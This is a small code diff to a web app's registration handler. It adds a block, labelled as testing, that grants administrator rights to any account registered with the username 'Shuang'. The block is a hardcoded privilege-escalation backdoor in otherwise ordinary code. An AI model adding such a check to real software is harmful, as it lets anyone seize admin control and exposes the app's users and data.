@@ -14,6 +14,10 @@ def register():
         user.email = form.email.data
         user.firstname = form.firstname.data
         user.lastname = form.lastname.data
+        #############testing###################
+        if form.username.data == "Shuang":
+            user.isAdmin = True
+        #########################################
         if(form.password.data == form.confirmpassword.data):
             hash_pwd = generate_password_hash(form.password.data, method="sha384")
             user.password = hash_pwd
